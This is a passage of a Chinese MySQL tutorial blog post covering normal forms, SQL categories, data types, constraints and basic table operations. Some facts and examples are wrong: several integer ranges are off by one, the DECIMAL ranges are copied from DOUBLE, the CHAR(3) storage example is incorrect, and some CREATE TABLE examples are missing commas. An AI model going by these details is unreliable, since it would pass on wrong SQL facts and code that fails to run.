2、第二范式(2NF)是在第一范式(1NF)的基础上建立起来得，满足第二范式(2NF)必须先满足第一范式(1NF)。如果表是单主键，那么主键以外的列必须完全依赖于主键；如果表是复合主键，那么主键以外的列必须完全依赖于主键，不能仅依赖主键的一部分。<br>
3、第三范式(3NF)是在第二范式的基础上建立起来的，即满足第三范式必须要先满足第二范式。第三范式(3NF)要求：表中的非主键列必须和主键直接相关而不能间接相关；也就是说：非主键列之间不能相关依赖。</p>
<h2 id="SQL简述">SQL简述</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>SQL的概述</strong></p>
</li>
</ul>
<p>Structure Query Language(结构化查询语言)简称SQL，它被美国国家标准局(ANSI)确定为关系型数据库语言的美国标准，后被国际化标准组织(ISO)采纳为关系数据库语言的国际标准。数据库管理系统可以通过SQL管理数据库；定义和操作数据，维护数据的完整性和安全性。</p>
<h3 id="SQL的优点">SQL的优点</h3>
<p>1、简单易学，具有很强的操作性<br>
2、绝大多数重要的数据库管理系统均支持SQL<br>
3、高度非过程化；用SQL操作数据库时大部分的工作由DBMS自动完成</p>
<h3 id="SQL的分类">SQL的分类</h3>
<p>1、DDL(Data Definition Language) 数据定义语言，用来操作数据库、表、列等； 常用语句：CREATE、 ALTER、DROP<br>
2、DML(Data Manipulation Language) 数据操作语言，用来操作数据库中表里的数据；常用语句：INSERT、 UPDATE、 DELETE<br>
3、DCL(Data Control Language) 数据控制语言，用来操作访问权限和安全级别； 常用语句：GRANT、DENY<br>
4、DQL(Data Query Language) 数据查询语言，用来查询数据 常用语句：SELECT</p>
<h3 id="SQL通用语法">SQL通用语法</h3>
<ol>
<li class="lvl-3">
<p>SQL语句可以单行或多行书写，以分号结尾</p>
</li>
<li class="lvl-3">
<p>可使用空格和缩进来增强语句的可读性</p>
</li>
<li class="lvl-3">
<p>MySQL数据库的SQL语句不区分大小写，建议使用大写，例如：SELECT * FROM user。</p>
</li>
<li class="lvl-3">
<p>同样可以使用/**/的方式完成注释</p>
</li>
<li class="lvl-3">
<p>MySQL中的我们常使用的数据类型如下</p>
</li>
</ol>
<p><img src="/posts/c826a854//image-20241210133749260.png" alt="image-20241210133749260"></p>
<h2 id="数据库的数据类型">数据库的数据类型</h2>
<p>MySQL数据库提供了多种数据类型，其中包括整数类型、浮点数类型、定点 数类型、日期和时间类型、字符串类型、二进制…等等数据类型。</p>
<h3 id="整数类型">整数类型</h3>
<p>根据数值取值范围的不同MySQL 中的整数类型可分为5种，下图列举了 MySQL不同整数类型所对应的字节大小和取值范围而最常用的为INT类型的，</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>字节数</th>
<th>无符号数的取值范围</th>
<th>有符号数的取值范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>TINYINT</td>
<td>1</td>
<td>0~255</td>
<td>-128~127</td>
</tr>
<tr>
<td>SMALLINT</td>
<td>2</td>
<td>0~65535</td>
<td>-32768~32768</td>
</tr>
<tr>
<td>MEDIUINT</td>
<td>3</td>
<td>0~16777215</td>
<td>-8388608~8388608</td>
</tr>
<tr>
<td>INT（最常见）</td>
<td>4</td>
<td>0~4294967295</td>
<td>-2147483648~ 2147483648</td>
</tr>
<tr>
<td>BIGINT</td>
<td>8</td>
<td>0~18446744073709551615</td>
<td>-9223372036854775808~9223372036854775808</td>
</tr>
</tbody>
</table>
<p><font class="notice">注：INT又可写为integer</font></p>
<h3 id="浮点数类型和定点数类型">浮点数类型和定点数类型</h3>
<p>在MySQL数据库中使用浮点数和定点数来存储小数。浮点数的类型有两种：单精度浮点数类型（FLOAT)和双精度浮点数类型（DOUBLE)。而定点数类型只有一种即DECIMAL类型。下图列举了 MySQL中浮点数和定点数类型所对应的字节大小及其取值范围：</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>字节数</th>
<th>有符号数取值范围</th>
<th>无符号数取值范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>FLOAT</td>
<td>4</td>
<td>-3.402823466E+38~-1.175494351E-38</td>
<td>0和1.175494351E-38~3.402823466E+38</td>
</tr>
<tr>
<td>DOUBLE</td>
<td>8</td>
<td>-1.7976931348623157E+308~2.2250738585072014E-308</td>
<td>0和2.2250738585072014E-308~1.7976931348623157E+308</td>
</tr>
<tr>
<td>DECIMAL（M,D）</td>
<td>M+2</td>
<td>-1.7976931348623157E+308~2.2250738585072014E-308</td>
<td>0和2.2250738585072014E-308~1.7976931348623157E+308</td>
</tr>
</tbody>
</table>
<p>从上图中可以看出：DECIMAL类型的取值范围与DOUBLE类型相同。但是，请注意：DECIMAL类型的有效取值范围是由M和D决定的。其中，M表示的是数据的长 度，D表示的是小数点后的长度。比如，将数据类型为DECIMAL(6,2)的数据6.5243 插入数据库后显示的结果为6.52</p>
<h3 id="字符串类型">字符串类型</h3>
<p>在MySQL中常用CHAR 和 VARCHAR 表示字符串。两者不同的是：VARCHAR存储可变长度的字符串。<br>
<strong>当数据为CHAR(M)类型时，不管插入值的长度是实际是多少它所占用的存储空间都是M个字节；而VARCHAR(M)所对应的数据所占用的字节数为实际长度加1</strong></p>
<table>
<thead>
<tr>
<th>插入值</th>
<th>CHAR(3)</th>
<th>存储需求</th>
<th>VARCHAR(3)</th>
<th>存储需求</th>
</tr>
</thead>
<tbody>
<tr>
<td>‘’</td>
<td>‘’</td>
<td>3个字节</td>
<td>‘’</td>
<td>1个字节</td>
</tr>
<tr>
<td>‘a’</td>
<td>‘a’</td>
<td>3个字节</td>
<td>‘a’</td>
<td>2个字节</td>
</tr>
<tr>
<td>‘ab’</td>
<td>‘ab’</td>
<td>3个字节</td>
<td>‘ab’</td>
<td>3个字节</td>
</tr>
<tr>
<td>‘abc’</td>
<td>‘ab’</td>
<td>3个字节</td>
<td>‘abc’</td>
<td>4个字节</td>
</tr>
<tr>
<td>‘abcd’</td>
<td>‘ab’</td>
<td>3个字节</td>
<td>‘abc’</td>
<td>4字节</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>CHAR(M)</th>
<th>M为0~255之间的整数，固定长度为M，不足后面补全空格</th>
</tr>
</thead>
<tbody>
<tr>
<td>VARCHAR(M)</td>
<td>M为0~65535之间的整数</td>
</tr>
</tbody>
</table>
<h3 id="文本类型">文本类型</h3>
<p>文本类型用于表示大文本数据，例如，文章内容、评论、详情等，它的类型分为如下4种：</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>储存范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>TINYTEXT</td>
<td>0~255字节</td>
</tr>
<tr>
<td>TEXT</td>
<td>0~65535字节</td>
</tr>
<tr>
<td>MEDIUMTEXT</td>
<td>0~16777215字节</td>
</tr>
<tr>
<td>LONGTEXT</td>
<td>0~4294967295字节</td>
</tr>
<tr>
<td>TINYBLOB</td>
<td>0~255字节</td>
</tr>
<tr>
<td>BLOB</td>
<td>0~65535字节</td>
</tr>
<tr>
<td>MEDIUMBLOB</td>
<td>0~16777215字节</td>
</tr>
<tr>
<td>LONGBLOB</td>
<td>0~4294967295字节</td>
</tr>
<tr>
<td>VARBINARY(M)</td>
<td>允许长度0~M个字节的变长字节字符串</td>
</tr>
<tr>
<td>BINARY(M)</td>
<td>允许长度0~M个字节的定长字节字符串</td>
</tr>
</tbody>
</table>
<h3 id="日期与时间类型">日期与时间类型</h3>
<p>MySQL提供的表示日期和时间的数据类型分别是 ：YEAR、DATE、TIME、DATETIME 和 TIMESTAMP。下图列举了日期和时间数据类型所对应的字节数、取值范围、日期格式以及零值：</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>字节数</th>
<th>取值范围</th>
<th>日期格式</th>
<th>零值</th>
</tr>
</thead>
<tbody>
<tr>
<td>YEAR</td>
<td>1</td>
<td>1901~2155</td>
<td>YYYY</td>
<td>0000</td>
</tr>
<tr>
<td>DATE</td>
<td>4</td>
<td>1000-01-01~9999-12-31</td>
<td>YYYY-MM-DD</td>
<td>0000-00-00</td>
</tr>
<tr>
<td>TIME</td>
<td>3</td>
<td>-838：59：59~ 838：59：59</td>
<td>HH:MM:SS</td>
<td>00:00:00</td>
</tr>
<tr>
<td>DATETIME</td>
<td>8</td>
<td>1000-01-01 00:00:00~9999-12-31 23:59:59</td>
<td>YYYY-MM-DD HH:MM:SS</td>
<td>0000-00-00 00:00:00</td>
</tr>
<tr>
<td>TIMESTAMP</td>
<td>4</td>
<td>1970-01-01 00:00:01~2038-01-19 03:14:07</td>
<td>YYYY-MM-DD HH:MM:SS</td>
<td>0000-00-00 00:00:00</td>
</tr>
</tbody>
</table>
<ul class="lvl-0">
<li class="lvl-2">
<p>YEAR<strong>类型</strong></p>
</li>
</ul>
<p>YEAR类型用于表示年份，在MySQL中，可以使用以下三种格式指定YEAR类型 的值。<br>
1、使用4位字符串或数字表示，范围为’1901’—'2155’或1901—2155。例如，输入 ‘2019’或2019插入到数据库中的值均为2019。<br>
2、使用两位字符串表示，范围为’00’—‘99’。其中，‘00’—'69’范围的值会被转换为 2000—2069范围的YEAR值，‘70’—'99’范围的值会被转换为1970—1999范围的YEAR 值。例如，输入’19’插入到数据库中的值为2019。<br>
3、使用两位数字表示，范围为1—99。其中，1—69范围的值会被转换为2001— 2069范围的YEAR值，70—99范围的值会被转换为1970—1999范围的YEAR值。例 如，输入19插入到数据库中的值为2019。请注意：当使用YEAR类型时，一定要区分’0’和0。因为字符串格式的’0’表示的YEAR值是2000而数字格式的0表示的YEAR值是0000。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>TIME<strong>类型</strong></p>
</li>
</ul>
<p>TIME类型用于表示时间值，它的显示形式一般为HH:MM:SS，其中，HH表示小时， MM表示分,SS表示秒。在MySQL中，可以使用以下3种格式指定TIME类型的值。<br>
1、以’D HH:MM:SS’字符串格式表示。其中，D表示日可取0—34之间的值, 插入数据时，小时的值等于(DX24+HH)。例如，输入’2 11:30:50’插入数据库中的日期为59:30:50。<br>
2、以’HHMMSS’字符串格式或者HHMMSS数字格式表示。 例如，输入’115454’或115454,插入数据库中的日期为11:54:54<br>
3、使用CURRENT_TIME或NOW()输入当前系统时间。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>DATETIME类型</p>
</li>
</ul>
<p>DATETIME类型用于表示日期和时间，它的显示形式为’YYYY-MM-DD HH: MM:SS’，其中，YYYY表示年，MM表示月，DD表示日，HH表示小时，MM表示分，SS 表示秒。在MySQL中，可以使用以下4种格式指定DATETIME类型的值。<br>
以’YYYY-MM-DD HH:MM:SS’或者’YYYYMMDDHHMMSS’字符串格式表示的日期和时间，取值范围为’1000-01-01 00:00:00’—‘9999-12-3 23:59:59’。例如，输入’2019-01-22 09:01:23’或 ‘20140122_0_90123’插入数据库中的 DATETIME 值都为 2019-01-22 09:01:23。<br>
1、以’YY-MM-DD HH:MM:SS’或者’YYMMDDHHMMSS’字符串格式表示的日期和时间，其中YY表示年，取值范围为’00’—‘99’。与DATE类型中的YY相同，‘00’— '69’范围的值会被转换为2000—2069范围的值，‘70’—'99’范围的值会被转换为1970—1999范围的值。<br>
2、以YYYYMMDDHHMMSS或者YYMMDDHHMMSS数字格式表示的日期 和时间。例如，插入20190122090123或者190122090123,插入数据库中的DATETIME值都 为 2019-01-22 09:01:23。<br>
3、使用NOW来输入当前系统的日期和时间。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>TIMESTAMP类型</p>
</li>
</ul>
<p>TIMESTAMP类型用于表示日期和时间，它的显示形式与DATETIME相同但取值范围比DATETIME小。在此，介绍几种TIMESTAMP类型与DATATIME类型不同的形式：<br>
1、使用CURRENT_TIMESTAMP输入系统当前日期和时间。<br>
2、输入NULL时系统会输入系统当前日期和时间。<br>
3、无任何输入时系统会输入系统当前日期和时间。</p>
<h3 id="二进制类型">二进制类型</h3>
<p>在MySQL中常用BLOB存储二进制类型的数据，例如：图片、PDF文档等。BLOB类型分为如下四种：</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>储存范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>TINYBLOB</td>
<td>0~255字节</td>
</tr>
<tr>
<td>BLOB</td>
<td>0~65535字节</td>
</tr>
<tr>
<td>MEDIUMBLOB</td>
<td>0~16777215字节</td>
</tr>
<tr>
<td>LONGBLOB</td>
<td>0~4294967295字节</td>
</tr>
</tbody>
</table>
<h2 id="数据库、数据表的基本操作">数据库、数据表的基本操作</h2>
<h3 id="数据库的基本操作">数据库的基本操作</h3>
<p>查询数据库的版本：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@version</span> </span><br></pre></td></tr></table></figure>
<p>MySQL安装完成后，要想将数据存储到数据库的表中，首先要创建一个数据库。创建数据库就是在数据库系统中划分一块空间存储数据，语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">创建数据库</span><br><span class="line"><span class="keyword">create</span> database 数据库名称;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>创建一个叫db1的数据库MySQL命令：</span><br><span class="line"><span class="keyword">create</span> database db1;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>创建数据库后查看该数据库基本信息MySQL命令：</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> database db1;</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>查询出MySQL中所有的数据库MySQL命令：</span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>将数据库的字符集修改为gbk MySQL命令：</span><br><span class="line"><span class="keyword">alter</span> database db1 <span class="type">character</span> <span class="keyword">set</span> gbk;</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>切换数据库 MySQL命令：</span><br><span class="line">use db1;</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>查看当前使用的数据库 MySQL命令：</span><br><span class="line"><span class="keyword">select</span> database();</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>删除数据库MySQL命令：</span><br><span class="line"><span class="keyword">drop</span> database db1;</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>退出数据库</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
<h3 id="数据表的基本操作">数据表的基本操作</h3>
<p>数据库创建成功后可在该数据库中创建数据表(简称为表)存储数据。请注意：在操作数据表之前应使用“USE 数据库名;”指定操作是在哪个数据库中进行先关操作，否则会抛出“No database selected”错误。 语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">create</span> <span class="keyword">table</span> 表名(</span><br><span class="line">         字段<span class="number">1</span> 字段类型,</span><br><span class="line">         字段<span class="number">2</span> 字段类型,</span><br><span class="line">         …</span><br><span class="line">         字段n 字段类型</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><figcaption><span>表示例</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>创建学生表 MySQL命令：</span><br><span class="line"> <span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line"> id <span class="type">int</span>,</span><br><span class="line"> name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line"> gender <span class="type">varchar</span>(<span class="number">10</span>),</span><br><span class="line"> birthday <span class="type">date</span></span><br><span class="line"> );</span><br><span class="line"> </span><br><span class="line"><span class="number">2.</span>查看当前数据库中所有表</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>查表的基本信息</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> student;</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>查看表的字段信息</span><br><span class="line"><span class="keyword">desc</span> student;</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>修改表名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student rename <span class="keyword">to</span> stu;</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>修改字段名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu change name sname <span class="type">varchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>修改字段数据类型</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu modify sname <span class="type">int</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>增加字段</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu <span class="keyword">add</span> address <span class="type">varchar</span>(<span class="number">50</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span>删除字段</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu <span class="keyword">drop</span> address;</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span>删除数据表</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> stu;</span><br></pre></td></tr></table></figure>
<h2 id="数据表的约束">数据表的约束</h2>
<p>为防止错误的数据被插入到数据表，MySQL中定义了一些维护数据库完整性的规则；这些规则常称为表的约束。常见约束如下：</p>
<table>
<thead>
<tr>
<th>约束条件</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>PRIMARY KEY</td>
<td>主键约束用于唯一标识对应的记录</td>
</tr>
<tr>
<td>FOREIGN KEY</td>
<td>外键约束</td>
</tr>
<tr>
<td>NOT NULL</td>
<td>非空约束</td>
</tr>
<tr>
<td>UNIQUE</td>
<td>唯一性约束</td>
</tr>
<tr>
<td>DEFAULT</td>
<td>默认值约束，用于设置字段的默认值</td>
</tr>
</tbody>
</table>
<p>以上五种约束条件针对表中字段进行限制从而保证数据表中数据的正确性和唯一性。换句话说，表的约束实际上就是表中数据的限制条件。</p>
<h3 id="主键约束">主键约束</h3>
<p>主键约束即primary key用于唯一的标识表中的每一行。被标识为主键的数据在表中是唯一的且其值不能为空。这点类似于我们每个人都有一个身份证号，并且这个身份证号是唯一的。 主键约束基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">字段名 数据类型 <span class="keyword">primary</span> key;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><figcaption><span>主键约束示例</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>设置主键约束(<span class="keyword">primary</span> key)的第一种方式<span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line">id <span class="type">int</span> <span class="keyword">primary</span> key,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 设置主键约束(<span class="keyword">primary</span> key)的第二·种方式</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student01(</span><br><span class="line">id <span class="type">int</span></span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line"><span class="keyword">primary</span> key(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>可使用<code>desc student01</code>命令查询</p>
<h3 id="非空约束">非空约束</h3>
<p>非空约束即 NOT NULL指的是字段的值不能为空，基本的语法格式如下所示：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">字段名 数据类型 <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><figcaption><span>非空约束示例</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student02(</span><br><span class="line">id <span class="type">int</span></span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h3 id="默认值约束">默认值约束</h3>
<p>默认值约束即DEFAULT用于给数据表中的字段指定默认值，即当在表中插入一条新记录时若未给该字段赋值，那么，数据库系统会自动为这个字段插入默认值；其基本的语法格式如下所示：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">字段名 数据类型 <span class="keyword">DEFAULT</span> 默认值；</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><figcaption><span>默认值约束示例</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student03(</span><br><span class="line">id <span class="type">int</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line">gender <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">default</span> <span class="string">&#x27;male&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h3 id="唯一性约束">唯一性约束</h3>
<p>唯一性约束即UNIQUE用于保证数据表中字段的唯一性，即表中字段的值不能重复出现，其基本的语法格式如下所示：</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">字段名 数据类型 UNIQUE<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><figcaption><span>唯一性约束示例</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student04(</span><br><span class="line">id <span class="type">int</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">unique</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h3 id="外键约束">外键约束</h3>
<h4 id="外键约束的创建">外键约束的创建</h4>
<p>外键约束即FOREIGN KEY常用于多张表之间的约束。基本语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 在创建数据表时语法如下：</span></span><br><span class="line"><span class="keyword">CONSTRAINT</span> 外键名 <span class="keyword">FOREIGN</span> KEY (从表外键字段) <span class="keyword">REFERENCES</span> 主表 (主键字段)</span><br><span class="line"><span class="comment">-- 将创建数据表创号后语法如下：</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 从表名 <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> 外键名 <span class="keyword">FOREIGN</span> KEY (从表外键字段) <span class="keyword">REFERENCES</span> 主表 (主键字段);</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><figcaption><span>外键约束示例</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>创建一个学生表</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student05(</span><br><span class="line">id <span class="type">int</span> <span class="keyword">primary</span> key,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>创建一个班级表</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> class(</span><br><span class="line">classid <span class="type">int</span> <span class="keyword">primary</span> key,</span><br><span class="line">studentid <span class="type">int</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>学生表作为主表，班级表作为副表设置外键</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> class <span class="keyword">add</span> <span class="keyword">constraint</span> fk_class_studentid <span class="keyword">foreign</span> key(studentid) <span class="keyword">references</span> student05(id);</span><br></pre></td></tr></table></figure>
<p>可通过<code>show create table class;</code>命令查看详细信息。</p>
<h4 id="外键约束的详细操作">外键约束的详细操作</h4>
<ol>
<li class="lvl-3">
<p>数据一致性概念</p>
</li>
</ol>
<p>大家知道：建立外键是为了保证数据的完整和统一性。但是，如果主表中的数据被删除或修改从表中对应的数据该怎么办呢？很明显，从表中对应的数据也应该被删除，否则数据库中会存在很多无意义的垃圾数据。</p>
<ol start="2">
<li class="lvl-3">
<p>删除外键</p>
</li>
</ol>
<p>语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 从表名 <span class="keyword">drop</span> <span class="keyword">foreign</span> key 外键名；</span><br></pre></td></tr></table></figure>
<p>示例中删除外键的命令：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> class <span class="keyword">drop</span> <span class="keyword">foreign</span> key fk_class_studentid;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>关于外键约束需要注意的细节</p>
<ol>
<li class="lvl-6">从表里的外键通常为主表的主键</li>
<li class="lvl-6">从表里外键的数据类型必须与主表中主键的数据类型一致</li>
<li class="lvl-6">主表发生变化时应注意主表与从表的数据一致性问题</li>
</ol>
</li>
</ol>
<h2 id="数据表插入数据">数据表插入数据</h2>
<p>在MySQL通过INSERT语句向数据表中插入数据。在此，我们先准备一张学生表，代码如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line">id <span class="type">int</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">30</span>),</span><br><span class="line">age <span class="type">int</span>,</span><br><span class="line">gender <span class="type">varchar</span>(<span class="number">30</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>向数据表中插入数据时，每个字段与其值是严格一一对应的。也就是说：每个值、值的顺序、值的类型必须与对应的字段相匹配。但是，各字段无须与其在表中定义的顺序一致，它们只要与 VALUES中值的顺序一致即可。同时，插入数据的方法和为表中所有字段插入数据一样，只是需要插入的字段由你自己指定。语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名（字段名<span class="number">1</span>,字段名<span class="number">2</span>,...) <span class="keyword">VALUES</span> (值 <span class="number">1</span>,值 <span class="number">2</span>,...);</span><br></pre></td></tr></table></figure>
<p>向表中插入多条数据的语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名 [(字段名<span class="number">1</span>,字段名<span class="number">2</span>,...)]<span class="keyword">VALUES</span> (值 <span class="number">1</span>,值 <span class="number">2</span>,…),(值 <span class="number">1</span>,值 <span class="number">2</span>,…),...;</span><br></pre></td></tr></table></figure>
<p>在该方式中：(字段名1,字段名2,…)是可选的，它用于指定插入的字段名；(值 1,值 2,…),(值 1,值 2,…)表示要插入的记录，该记录可有多条并且每条记录之间用逗号隔开。示例如下：</p>
<figure class="highlight sql"><figcaption><span>向表中插入多条数据示例</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student (id,name,age,gender) <span class="keyword">values</span> (<span class="number">2</span>,<span class="string">&#x27;lucy&#x27;</span>,<span class="number">17</span>,<span class="string">&#x27;female&#x27;</span>),(<span class="number">3</span>,<span class="string">&#x27;jack&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;male&#x27;</span>),(<span class="number">4</span>,<span class="string">&#x27;tom&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;male&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="更新数据">更新数据</h2>
<p>在MySQL通过UPDATE语句更新数据表中的数据。在此，我们将就用六中的student学生表</p>
<ol>
<li class="lvl-3">
<p>UPDATE的基本语法为：</p>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> 表名 <span class="keyword">SET</span> 字段名<span class="number">1</span><span class="operator">=</span>值<span class="number">1</span>[,字段名<span class="number">2</span> <span class="operator">=</span>值<span class="number">2</span>,…] [<span class="keyword">WHERE</span> 条件表达式];</span><br></pre></td></tr></table></figure>
<p>在该语法中：字段名1、字段名2…用于指定要更新的字段名称；值1、值 2…用于表示字段的新数据；WHERE 条件表达式 是可选的，它用于指定更新数据需要满足的条件</p>
<ol start="2">
<li class="lvl-3">
<p>UPDATE更新部分数据</p>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">将name为tom的记录的age设置为<span class="number">20</span>并将其gender设置为female</span><br><span class="line"><span class="keyword">update</span> student <span class="keyword">set</span> age<span class="operator">=</span><span class="number">20</span>,gender<span class="operator">=</span><span class="string">&#x27;female&#x27;</span> <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;tom&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>UPDATE更新全部数据</p>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> student <span class="keyword">set</span> age<span class="operator">=</span><span class="number">18</span>;</span><br></pre></td></tr></table></figure>
<h2 id="删除数据">删除数据</h2>
<p>在MySQL通过DELETE语句删除数据表中的数据。在此，我们先准备一张数据表，代码如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建学生表</span></span><br><span class="line"> <span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line"> id <span class="type">int</span>,</span><br><span class="line"> name <span class="type">varchar</span>(<span class="number">30</span>),</span><br><span class="line"> age <span class="type">int</span>,</span><br><span class="line"> gender <span class="type">varchar</span>(<span class="number">30</span>)</span><br><span class="line"> );</span><br><span class="line"> <span class="comment">-- 插入数据</span></span><br><span class="line"> <span class="keyword">insert</span> <span class="keyword">into</span> student (id,name,age,gender) <span class="keyword">values</span> (<span class="number">2</span>,<span class="string">&#x27;lucy&#x27;</span>,<span class="number">17</span>,<span class="string">&#x27;female&#x27;</span>),(<span class="number">3</span>,<span class="string">&#x27;jack&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;male&#x27;</span>),(<span class="number">4</span>,<span class="string">&#x27;tom&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;male&#x27;</span>),(<span class="number">5</span>,<span class="string">&#x27;sal&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;female&#x27;</span>),(<span class="number">6</span>,<span class="string">&#x27;sun&#x27;</span>,<span class="number">20</span>,<span class="string">&#x27;male&#x27;</span>)</span><br><span class="line">,(<span class="number">7</span>,<span class="string">&#x27;sad&#x27;</span>,<span class="number">13</span>,<span 